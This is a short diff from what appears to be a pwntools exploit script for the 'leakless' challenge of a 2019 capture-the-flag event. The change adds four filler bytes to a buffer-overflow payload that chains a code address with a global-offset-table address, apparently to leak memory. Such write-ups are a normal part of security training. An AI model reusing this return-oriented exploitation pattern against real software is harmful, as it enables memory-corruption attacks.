@@ -6,6 +6,7 @@ target = process("./chall-test_fireshell19-leakless")
 payload = ""
 payload += "0000000000000000000000000000000000000000000000000000000000000000000000000000"
 payload += p32(0x80490e0)
+payload += "0000"
 payload += p32(0x804c018)
 target.sendline(payload)
 # Scan in all of the input
